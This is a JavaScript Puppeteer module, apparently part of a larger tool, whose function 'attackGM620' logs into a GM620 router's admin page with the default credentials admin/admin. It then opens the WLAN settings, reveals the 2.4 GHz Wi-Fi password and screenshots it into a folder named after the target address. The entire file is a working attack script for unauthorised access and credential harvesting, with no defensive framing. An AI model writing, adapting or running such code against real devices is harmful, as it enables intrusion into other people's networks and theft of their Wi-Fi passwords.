export default async function attackGM620(page, endereco) {
    {
        await page.focus("#Frm_Username");
        await page.keyboard.type("admin");
    }
    {
        await page.focus("#Frm_Password");
        await page.keyboard.type("admin");
    }
    {
        await page.click("#LoginId")
    }
    {
        await page.waitForTimeout(5000)
        const frame = page.frames()
            .filter(frame => frame.url().includes("template") || frame.url().includes("getpage"))[0]

        await page.waitForTimeout(500);
        await frame.click("#mmNet");

        await page.waitForTimeout(500);
        await frame.click("#smWLAN");

        await page.waitForTimeout(5000);
        await frame.click("#Frm_Advan_PassSrc24G")
    }
    {
        const enderecoUrlFoto = endereco
            .replace("http://", "")
            .replace(".", "");

        await page.screenshot({
            path: `./fotos/${enderecoUrlFoto}.png`,
            fullPage: true
        });
    }
}